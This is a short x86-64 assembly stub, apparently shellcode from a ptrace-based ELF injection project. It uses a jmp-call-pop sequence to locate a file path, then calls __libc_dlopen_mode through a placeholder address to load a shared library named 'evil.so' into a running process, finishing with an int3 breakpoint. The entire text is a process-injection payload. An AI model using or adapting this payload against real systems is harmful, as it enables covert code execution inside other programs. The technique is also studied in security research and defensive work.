push rax
_start: jmp string
begin: pop rax ; char *file
mov esi, 0x1 ; int mode
mov rdi, rax
mov rbx, 0x1112345678 ; addr   __libc_dlopen_mode()
call rbx ; call __libc_dlopen_mode()
int3 ; breakpoint

string: call begin
db "/home/hzc/code/gobpf/ptrace/evilELF/InjectRuntimeELF/example/evil.so",0x00
